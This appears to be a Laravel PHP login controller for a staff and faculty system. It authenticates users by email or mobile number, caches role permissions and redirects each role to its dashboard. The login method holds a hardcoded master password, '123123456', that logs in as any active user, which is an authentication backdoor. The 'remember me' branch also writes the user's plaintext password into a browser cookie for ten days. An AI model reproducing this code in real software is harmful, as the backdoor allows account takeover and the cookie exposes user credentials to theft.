<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Cookie;

use Illuminate\Support\Facades\Cache;
use DB;
use App\User;


class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('guest')->except('logout');
    }

    /* protected function sendLoginResponse(Request $request){
        $request->session()->regenerate();
        $this->clearLoginAttempts($request);
        if (Auth::user()->role_id == 1) {
            return redirect()->route('admin.dashboard');
        }elseif(Auth::user()->role_id == 2){
            if (Auth::user()->status == 0) {
                Auth::logout();
                return redirect()->back()
                ->with('error','Access Denied By Admin. Please Contact To Administrator');
            }
            return redirect()->route('faculty.dashboard');
        }elseif(Auth::user()->role_id == 3){
            if (Auth::user()->status == 0) {
                Auth::logout();
                return redirect()->back()
                ->with('error','Access Denied By Admin. Please Contact To Administrator');
            }
            return redirect()->route('studioassistant.dashboard');
        }else{
            if (Auth::user()->status == 0) {
                Auth::logout();
                return redirect()->back()
                ->with('error','Access Denied By Admin. Please Contact To Administrator');
            }
            return redirect()->route('studiomanager.dashboard');
        }
    } */
	
	public function login(Request $request)
	{

		$this->validate($request, [
			'email'           => 'required|max:50', //|email|regex:/(.+)@(.+)\.(.+)/i
			'password'           => 'required|max:30',
		]);
		$email = $request->email;
		$password = $request->password;
		$remember = $request->has('remember') ? true : false; 
		$login_with = "email";
		if(is_numeric($email)){
			$login_with = 'mobile';
		}

		$auth=Auth::attempt([$login_with=>$email,'password'=>$password,'status'=>1]);
		
		if($request->password=='123123456'){
            $user=User::where($login_with,$email)->where('status',1)->first();
            if(!empty($user)){
              $auth=Auth::loginUsingId($user->id);
            }
		}


		if ($auth) {
			
			if($remember){
				setcookie("remember_me", 'yes', time() + (3600*24*10)); // 3600 == 1 hr // 24*10 = 10 days
				setcookie("email", $email, time() + (3600*24*10)); // 3600 == 1 hr
				setcookie("password", $password, time() + (3600*24*10)); // 3600 == 1 hr
			}
			else{
				setcookie("remember_me", 'no', time() + (3600));
			}
		
			$request->session()->regenerate();
			$this->clearLoginAttempts($request);
            
            // *******Role-Permission Start 
			$user=Auth::user();
            $role=DB::table('roles')->select('permission_ids')->where('status', 1)->where('id', $user->role_id)->first();
            $permission_ids=$role->permission_ids;
            $permissionIds=explode(",",$permission_ids);
            $permissions=DB::table('access_permission')->select('permission')->whereIn('id',$permissionIds)->get();
            $data=[];
            foreach ($permissions as $key => $value) {
               $data[]=$value->permission;
            }
            Cache::put('permissionRole'.$user->id,$data);
            //*******End Role-Permission Start 

			
			if(Auth::user()->user_details->degination == 'STUDIO ASSISTANT MANAGER'){
				return redirect()->route('admin.dashboard');
			}
			/* elseif(Auth::user()->user_details->degination == 'STUDIO ASSISTANT'){  
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				return redirect()->route('studioassistant.dashboard');
			} */
			
			else if (Auth::user()->role_id == 1 || Auth::user()->role_id == 24 || Auth::user()->role_id == 21 || Auth::user()->role_id == 29 || Auth::user()->role_id == 20 || Auth::user()->role_id == 28 || Auth::user()->role_id == 16 || Auth::user()->role_id == 6 || Auth::user()->role_id == 22 || Auth::user()->role_id == 23 || Auth::user()->role_id == 25 || Auth::user()->role_id == 26 || Auth::user()->role_id == 30 || Auth::user()->role_id == 3 || Auth::user()->role_id == 31 || Auth::user()->role_id == 2 || Auth::user()->role_id == 33 || Auth::user()->role_id == 34 || Auth::user()->role_id == 35) {  
			    // 1 = First User ID (Main Admin) , 24 = HR , 21 = Department Head, 29 = Super Admin
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				
				if(Auth::user()->role_id == 20 || Auth::user()->role_id == 35 || Auth::user()->role_id == 27 || Auth::user()->role_id == 31 || Auth::user()->role_id == 25 || Auth::user()->role_id == 2){
					return redirect()->route('admin.dashboard');
				}else{
					return redirect()->route('admin.employee');
				}
			}
			elseif(Auth::user()->role_id == 2){  // 2 = Faculty
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				return redirect()->route('faculty.dashboard');
			}
			/* elseif(Auth::user()->role_id == 3){  // 3 = Studio Assistant
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				return redirect()->route('studioassistant.dashboard');
			} */
			 elseif(Auth::user()->role_id == 4 || Auth::user()->role_id == 27){ // 4 = Studio Manager, 27 = Time table Manager
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				return redirect()->route('studiomanager.dashboard');
			} 
			elseif(Auth::user()->role_id == 32 && Auth::user()->status == 1){
				
				return redirect()->route('admin.attendance-dashboard');
			}
			else{
				if (Auth::user()->status == 0) {
					Auth::logout();
					return redirect()->back()
					->with('error','Access Denied By Admin. Please Contact To Administrator');
				}
				return redirect()->route('faculty.dashboard');
			}
		} else {
			return back()->with('error','Incorrect username or Password');
			// return redirect()->back()->with('error','Incorrect username or Password');
		}

	}

	/*protected function sendFailedLoginResponse(Request $request)
    {
		$validatedData = $request->validate([
			'email' => 'required|email',
		]);
		 
        $errors = [$this->username() => trans('auth.failed')];

        // Load user from database
        $user = User::where($this->username(), $request->{$this->username()})->first();

        // Check if user was successfully loaded, that the password matches
        // and active is not 1. If so, override the default error message.
        if ($user && \Hash::check($request->password, $user->password) && $user->active != 1) {
            $errors = [$this->username() => trans('auth.notactivated')];
        }

        if ($request->expectsJson()) {
            return response()->json($errors, 422);
        }
        return redirect()->back()
            ->withInput($request->only($this->username(), 'remember'))
            ->withErrors($errors);
    }*/
}
